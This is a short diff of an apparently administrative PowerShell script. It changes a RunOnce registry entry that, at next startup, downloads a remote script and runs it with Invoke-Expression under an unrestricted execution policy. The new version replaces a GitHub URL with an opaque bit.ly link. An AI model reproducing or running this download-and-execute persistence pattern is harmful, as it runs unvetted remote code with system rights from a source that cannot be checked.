@@ -1,4 +1,4 @@
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "NextStep" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -Command '(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/OralSeth/mess_01/master/651_3.ps1') | Invoke-Expression'"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "NextStep" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -Command '(New-Object Net.WebClient).DownloadString('http://bit.ly/651_3') | Invoke-Expression'"
 
 Function Get-UninstallString {
     [CmdletBinding(DefaultParameterSetName = "ByName")]
